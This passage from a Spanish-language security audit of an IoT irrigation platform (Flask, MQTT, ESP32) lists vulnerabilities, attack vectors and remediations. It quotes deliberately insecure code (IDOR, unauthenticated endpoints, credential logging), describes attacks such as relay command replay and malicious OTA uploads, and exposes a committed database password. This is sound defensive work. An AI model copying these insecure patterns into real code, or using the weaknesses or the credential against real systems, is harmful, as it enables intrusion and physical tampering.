**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Descripción técnica:**

```python
# app.py líneas 1312-1335
@app.route("/api/alerts")
def api_alerts():
    mac = request.args.get('mac')       # cualquier MAC, sin verificar ownership
    finca_id = request.args.get('finca_id')  # cualquier finca_id
    ...
    if mac:
        query += " AND device_mac=?"
        params.append(mac)
    if finca_id:
        query += " AND finca_id=?"
        params.append(finca_id)
    rows = get_db().execute(query, params).fetchall()
    return jsonify([dict(r) for r in rows])  # sin filtrar por usuario
```

Un usuario autenticado puede enumerar alertas de cualquier dispositivo especificando una MAC arbitraria, sin que se verifique si ese dispositivo le pertenece.

Similar problema con `/api/alerts/<alert_id>/ack` — un usuario puede marcar como resuelta una alerta de otro usuario.

**Remediación:**

```python
@app.route("/api/alerts")
def api_alerts():
    user_id = int(get_jwt_identity())
    # Obtener MACs del usuario
    user_macs = [row["mac_address"] for row in _get_user_devices_rows(user_id)]
    if not user_macs:
        return jsonify([])

    requested_mac = request.args.get('mac')
    if requested_mac and requested_mac.upper() not in user_macs:
        return jsonify({"error": "Acceso denegado al dispositivo"}), 403

    # Filtrar siempre por las MACs del usuario
    placeholders = ','.join(['%s'] * len(user_macs))
    query = f"SELECT * FROM alerts WHERE device_mac IN ({placeholders})"
    params = list(user_macs)
    ...
```

---

### VULN-014 — TLS mínimo TLSv1.2 (debería ser TLSv1.3)

**Severidad:** MEDIA
**CVSS 3.1:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-326 (Inadequate Encryption Strength)

**Descripción técnica:**

```
# mosquitto.conf línea 16
tls_version tlsv1.2
```

TLS 1.2 es considerado legacy. TLS 1.3 elimina cipher suites inseguros (RSA key exchange, MD5, SHA-1), ofrece forward secrecy obligatorio y reduce la superficie de ataque. Dispositivos ESP32 con IDF >= 4.4 soportan TLS 1.3.

**Remediación:**

```
# mosquitto.conf
tls_version tlsv1.3  # o tlsv1.2,tlsv1.3 si se necesita compatibilidad
# Añadir cipher suites seguros:
ciphers_tls1.3 TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
```

---

### VULN-015 — Endpoint /send_message sin autenticación (legacy HTTP CSV)

**Severidad:** MEDIA
**CVSS 3.1:** 6.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Descripción técnica:**

```python
# app.py líneas 425-471
@app.route("/send_message", methods=["POST"])
def send_message():
    message = request.get_data().decode("utf-8")  # Sin autenticación
    data = parse_message_data(message)
    # Inserta directamente en home_weather_station
    cursor.execute("""INSERT INTO home_weather_station(...) VALUES (...)""", ...)
```

Este endpoint legacy acepta datos CSV de dispositivos sin ninguna autenticación. No está en la lista `_JWT_PUBLIC` porque no es una ruta `/api/`, pero tampoco tiene ningún control de acceso. Cualquier actor puede insertar lecturas falsas.

**Remediación:**

```python
# Si el endpoint ya no se usa con dispositivos actuales (que usan MQTT):
@app.route("/send_message", methods=["POST"])
def send_message():
    return jsonify({"error": "Endpoint deprecado"}), 410  # Gone

# Si aún se necesita, añadir autenticación por token de dispositivo
```

---

### VULN-016 — Logging de credenciales en texto claro

**Severidad:** BAJA
**CVSS 3.1:** 3.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Descripción técnica:**

```python
# app.py líneas 1360-1362
app.logger.info(
    f"[mqtt/auth] user={username!r} ok={bool(username and password)}")
```

El username (MAC address del dispositivo) se loguea en cada intento de autenticación MQTT. Si el nivel de log se aumenta a DEBUG en producción, el password también quedaría en los logs.

Adicionalmente en `mqtt_client.py`:

```python
# mqtt_client.py línea 252-253
logger.exception("Error procesando mensaje MQTT: topic=%s payload=%s",
                 msg.topic, msg.payload[:200])
```

Los primeros 200 bytes del payload se loguean en caso de error, lo que puede incluir información sensible del dispositivo.

**Remediación:**

```python
# Loguear solo información no sensible
app.logger.info("[mqtt/auth] auth_attempt user_hash=%s", 
                hashlib.sha256(username.encode()).hexdigest()[:8])

# En el handler de errores MQTT, no loguear el payload completo
logger.exception("Error procesando mensaje MQTT: topic=%s", msg.topic)
# (omitir payload en producción)
```

---

### VULN-017 — Información técnica expuesta en UI sin control de rol

**Severidad:** BAJA
**CVSS 3.1:** 3.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**Descripción técnica:**

```javascript
// SettingsView.jsx líneas 270-279
{[
    ['GPIO relay (ESP32)', 'GPIO 26'],
    ['Modelo relay', 'JQC-3FF-S-Z · activo-HIGH'],
    ['Puerto OTA', '3232'],
].map(([label, val]) => (...))}
```

El número de GPIO, modelo específico de relay y puerto OTA del firmware se muestran a cualquier usuario autenticado. Esta información facilita el diseño de ataques dirigidos al hardware.

**Remediación:** Mover esta información a una sección solo visible para administradores o eliminarla de la UI.

---

### VULN-018 — Sin mecanismo de revocación de JWT

**Severidad:** BAJA / INFORMATIVA
**CWE:** CWE-613 (Insufficient Session Expiration)

**Descripción técnica:**

El sistema emite JWT con 30 días de validez (`JWT_ACCESS_TOKEN_EXPIRES = datetime.timedelta(days=30)`) pero no implementa:
- Blacklist de tokens revocados
- Endpoint de logout que invalide el token en servidor
- Refresh token con rotación

Al hacer logout en el frontend (`localStorage.removeItem('aq_token')`), el token sigue siendo válido en el servidor durante el tiempo restante. Si un atacante obtuvo el token (ej. por XSS o por robo de la sesión), puede seguir usándolo hasta que expire.

**Remediación:**

```python
# Implementar JTI (JWT ID) + blacklist en Redis o PostgreSQL

from flask_jwt_extended import get_jwt
import redis

redis_client = redis.Redis(host='redis', port=6379)
JWT_BLOCKLIST_TTL = 30 * 24 * 60 * 60  # 30 días en segundos

@jwt.token_in_blocklist_loader
def check_if_token_revoked(jwt_header, jwt_payload):
    jti = jwt_payload["jti"]
    return redis_client.get(f"revoked:{jti}") is not None

@app.route("/api/auth/logout", methods=["POST"])
@jwt_required()
def auth_logout():
    jti = get_jwt()["jti"]
    redis_client.setex(f"revoked:{jti}", JWT_BLOCKLIST_TTL, "1")
    return jsonify({"ok": True})
```

---

## 3. Superficie de Ataque

### Puertos y Servicios Expuestos

| Puerto | Servicio | Protocolo | TLS | Auth | Exposición | Riesgo |
|--------|----------|-----------|-----|------|-----------|--------|
| 7000 | Flask Backend API | HTTP | No | JWT (parcial) | Host/Internet | ALTO |
| 5432 | TimescaleDB | TCP | No | Password | Host/Internet | CRITICO |
| 1883 | MQTT Broker | TCP | No | go-auth | Host/Internet | ALTO |
| 8883 | MQTT Broker TLS | TLS | TLSv1.2 | go-auth | Internet | MEDIO |
| 8888 | Adminer Web UI | HTTP | No | DB credentials | Host/Internet | CRITICO |
| 3232 | OTA Firmware | TCP | ? | ? | Red local ESP32 | ALTO |

### Endpoints HTTP por Nivel de Riesgo

**Sin autenticación (público):**
- `POST /api/auth/register` — creación de cuentas sin rate limiting
- `POST /api/auth/login` — login sin rate limiting
- `POST /api/mqtt/auth` — webhook MQTT auth (debe ser accesible solo desde Mosquitto)
- `POST /api/mqtt/acl` — webhook MQTT ACL (mismo problema)
- `POST /api/devices/register_factory` — registro de fábrica (solo IPs internas)
- `GET /api/pipeline/scenario` — configuración de pipeline (sin auth, ESP32)
- `GET /api/pipeline/config` — configuración de pipeline (sin auth, ESP32)
- `POST /api/device_info` — info dispositivo (sin auth) **VULN-002**
- `GET /api/relay/command` — estado relay (sin auth) **VULN-002**
- `POST /api/relay/ack` — ack relay (sin auth) **VULN-002**
- `POST /send_message` — endpoint CSV legacy (sin auth) **VULN-015**

**Autenticados (JWT requerido):**
- `GET /api/settings` — cualquier usuario puede leer todos los settings
- `POST /api/settings` — cualquier usuario puede modificar todos los settings **VULN-012**
- `GET /api/alerts` — IDOR por MAC **VULN-013**
- `POST /api/alerts/<id>/ack` — sin verificar ownership **VULN-013**
- `POST /api/pipeline/config` — cualquier usuario puede cambiar modo global
- `GET /api/devices` — correcto (filtra por user_id)
- `GET /api/muestras/<n>` — correcto (filtra por user_id → MAC)

---

## 4. Vectores de Ataque IoT (ESP32/MQTT)

### 4.1 Dispositivo ESP32 Comprometido

Un dispositivo ESP32 cuyo firmware haya sido modificado (ej. mediante ataque OTA, acceso físico, o firmware malicioso) puede:

1. **Publicar telemetría falsa** en su propio topic sin restricción de valores. Sin validación de esquema (VULN-009), puede insertar datos que activen alertas falsas, corrompan estadísticas de riego, o saturen la base de datos.

2. **Controlar relays de otros dispositivos** (VULN-003): la ACL MQTT permisiva permite publicar en `aquantia/OTRA_FINCA/cmd`, activando físicamente las electroválvulas de otra instalación.

3. **Suscribirse a telemetría de todos los dispositivos**: puede leer `aquantia/+/telemetry` y obtener lecturas ambientales, estado de relays y firmware de todos los clientes del sistema.

### 4.2 Ataque Man-in-the-Middle en Red Local

Los ESP32 se conectan por MQTT TLS al puerto 8883 (correcto), pero:
- El backend Flask se conecta a Mosquitto por el puerto 1883 sin TLS (dentro de Docker). Si hay compromiso del host Docker, el tráfico interno es en texto claro.
- El listener 1883 está expuesto al host (VULN-010), permitiendo ataques desde la red local del servidor.

### 4.3 Ataque de Replay de Comandos Relay

Los comandos relay publicados via MQTT (`aquantia/<finca>/cmd`) no incluyen:
- Timestamp del comando (ningún mecanismo de expiración)
- Firma criptográfica del servidor
- Nonce o número de secuencia

Un atacante que capture tráfico MQTT puede reproducir comandos relay anteriores para activar/desactivar válvulas. Aunque el QoS 1 garantiza entrega, no garantiza autenticidad ni frescura del mensaje.

### 4.4 Falsificación de Registro de Dispositivo

El endpoint `POST /api/devices/register_factory` confía en que solo IPs internas Docker lo llamen:

```python
# app.py líneas 1469-1477
allowed = ("127.0.0.1", "::1")
if addr not in allowed and not (
    addr.startswith("172.") or addr.startswith("10.") or addr.startswith("192.168.")
):
    return jsonify({"error": "forbidden"}), 403
```

Esta verificación de IP es bypasseable si:
- Hay SSRF en cualquier otro endpoint del mismo servidor
- El servidor tiene una interfaz de red en rangos 172.x, 10.x, 192.168.x (casi siempre en Docker)
- Existe un proxy inverso que añade `X-Forwarded-For` y el código lee `request.remote_addr` en lugar de verificar correctamente los headers de proxy

### 4.5 Enumeración de Dispositivos por MAC Address

Los endpoints `GET /api/relay/command?mac=XX` y `POST /api/relay/ack` aceptan cualquier MAC sin autenticación. Un atacante puede enumerar el estado de relay de todos los dispositivos conocidos (o por fuerza bruta) para identificar qué dispositivos están activos y su estado actual.

### 4.6 Abuso del Puerto OTA (3232)

La UI expone que el ESP32 usa el puerto 3232 para actualizaciones OTA (Over-The-Air). Si este puerto no implementa autenticación y está accesible en la red local del dispositivo, un atacante en la misma red (o con acceso por la red de la finca) podría subir firmware malicioso al dispositivo.

---

## 5. Recomendaciones Prioritarias (Top 5)

### Prioridad 1 — INMEDIATO (Hoy): Rotar credenciales comprometidas y aislar servicios

El archivo `backend/.env` con `PG_PASS=aquantia_159` ha sido commiteado al repositorio. Esta contraseña debe considerarse comprometida.

**Acciones:**
1. Cambiar la contraseña de PostgreSQL en producción inmediatamente
2. Generar un nuevo `JWT_SECRET_KEY` aleatorio de 256 bits (invalida todos los tokens activos, usuarios deben reloguearse)
3. Eliminar el mapeo de puertos 5432 y 8888 de `docker-compose.yml`
4. Añadir `backend/.env` al `.gitignore` y purgar del historial Git
5. Revocar y rotar el `MQTT_PASSWORD` del usuario backend

### Prioridad 2 — Esta semana: Autenticar endpoints ESP32

Implementar autenticación de dispositivo en `POST /api/device_info`, `GET /api/relay/command` y `POST /api/relay/ack`. El sistema ya tiene `device_credentials` con `token_hash` — usarlo para verificar el token del dispositivo en estos endpoints.

Esto requiere un cambio coordinado con el firmware del ESP32 para incluir el token en las peticiones HTTP.

### Prioridad 3 — Esta semana: Implementar ACL MQTT real

El endpoint `/api/mqtt/acl` debe verificar que el `finca_id` del topic coincide con el `finca_id` asignado al dispositivo autenticado. Esto es un cambio de unas 30 líneas de código que previene que dispositivos comprometidos controlen otras instalaciones.

### Prioridad 4 — Próximo sprint: Migrar JWT a HttpOnly cookies y reducir expiración

Cambiar el almacenamiento del JWT de `localStorage` a cookie `HttpOnly; Secure; SameSite=Strict`. Reducir la expiración de 30 días a 8 horas con refresh token. Añadir rate limiting con `flask-limiter` en los endpoints de autenticación.

### Prioridad 5 — Próximo sprint: Añadir cabeceras de seguridad HTTP y validación de esquema MQTT

Implementar el middleware de cabeceras HTTP (CSP, HSTS, X-Frame-Options, etc.) y añadir validación de esquema Pydantic en los handlers MQTT para rechazar valores fuera de rango.

---

## 6. Matriz de Riesgo

| ID | Vulnerabilidad | Probabilidad | Impacto | Riesgo |
|----|---------------|-------------|---------|--------|
| VULN-001 | Credenciales hardcodeadas en repo | MUY ALTA | CRITICO | **CRITICO** |
| VULN-002 | Endpoints ESP32 sin autenticación | ALTA | CRITICO | **CRITICO** |
| VULN-003 | ACL MQTT permisiva | MEDIA | CRITICO | **CRITICO** |
| VULN-007 | Puerto 5432 expuesto al host | ALTA | CRITICO | **CRITICO** |
| VULN-008 | Adminer expuesto sin auth adicional | ALTA | ALTO | **ALTO** |
| VULN-004 | CORS wildcard | ALTA | ALTO | **ALTO** |
| VULN-005 | JWT en localStorage | MEDIA | ALTO | **ALTO** |
| VULN-006 | Sin rate limiting en auth | MUY ALTA | ALTO | **ALTO** |
| VULN-009 | Sin validación de esquema MQTT | MEDIA | MEDIO | **MEDIO** |
| VULN-010 | MQTT 1883 expuesto al host | MEDIA | MEDIO | **MEDIO** |
| VULN-011 | Sin cabeceras de seguridad HTTP | BAJA | MEDIO | **MEDIO** |
| VULN-012 | Settings sin control de rol | MEDIA | MEDIO | **MEDIO** |
| VULN-013 | IDOR en /api/alerts | MEDIA | MEDIO | **MEDIO** |
| VULN-014 | TLS 1.2 mínimo | BAJA | MEDIO | **MEDIO** |
| VULN-015 | /send_message sin autenticación | MEDIA | MEDIO | **MEDIO** |
| VULN-016 | Logging de credenciales | BAJA | BAJO | **BAJO** |
| VULN-017 | Info técnica en UI sin control | BAJA | BAJO | **BAJO** |
| VULN-018 | Sin revocación de JWT | MEDIA | BAJO | **BAJO** |

### Leyenda de Probabilidad
- **MUY ALTA**: Explotable sin conocimiento especializado, herramientas automatizadas disponibles
- **ALTA**: Requiere conocimiento básico de HTTP/MQTT, sin barreras significativas
- **MEDIA**: Requiere acceso autenticado o conocimiento del sistema
- **BAJA**: Requiere condiciones específicas o conocimiento avanzado

### Leyenda de Impacto
- **CRITICO**: Compromiso total del sistema, datos de todos los usuarios, control físico de dispositivos
- **ALTO**: Compromiso de cuentas individuales o datos sensibles de grupos de usuarios
- **MEDIO**: Corrupción de datos, información limitada, acceso parcial no autorizado
- **BAJO**: Información mínima, impacto operacional limitado

---

## 7. Resumen de Cambios Requeridos por Archivo

| Archivo | Cambios Críticos |
|---------|-----------------|
| `backend/.env` | Eliminar del repo, rotar `PG_PASS` |
| `docker-compose.yml` | Eliminar ports 5432, 8888; eliminar fallbacks de secrets; eliminar port 1883 |
| `backend/app.py` | Rate limiting en auth; autenticación en endpoints ESP32; ACL MQTT real; cabeceras HTTP; control de rol en settings; filtrado por ownership en alerts |
| `backend/mqtt_client.py` | Validación de esquema con Pydantic en todos los handlers |
| `frontend/src/AuthContext.jsx` | Migrar token a HttpOnly cookie; reducir expiración a 8h |
| `mosquitto/config/mosquitto.conf` | Actualizar tls_version a tlsv1.3; bind listener 1883 solo a red interna |
| `backend/requirements.txt` | Añadir: `flask-limiter`, `pydantic>=2.0`, `redis` |

---

*Informe generado el 2026-04-30. Las vulnerabilidades deben ser verificadas en el entorno de staging antes de aplicar remediaciones en producción. Algunas remediaciones en endpoints IoT requieren coordinación con el firmware del ESP32.*
